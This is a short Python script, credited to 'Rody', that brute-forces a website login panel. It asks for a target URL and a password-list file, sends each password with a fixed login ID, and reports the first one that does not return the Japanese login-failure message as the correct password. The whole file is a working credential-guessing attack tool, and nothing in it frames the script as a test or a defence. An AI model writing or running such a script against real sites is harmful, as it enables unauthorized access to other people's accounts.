from requests import post

print("created by:Rody")
url = input("Enter website login panel: ")
password_list = input("Password list: ")
author = "20"
for password in open(password_list):
    password = password.strip("\n")
    res = post(url,data = {"login_id" : author , "password" : password})
    content = res.text
    if "ログインできません。" in content:
        print("{}".format(password)+" is incorrect")
    else:
        print(content)
        print("-"*50)
        print("Correct PASSWORD -->{}".format(password))
        break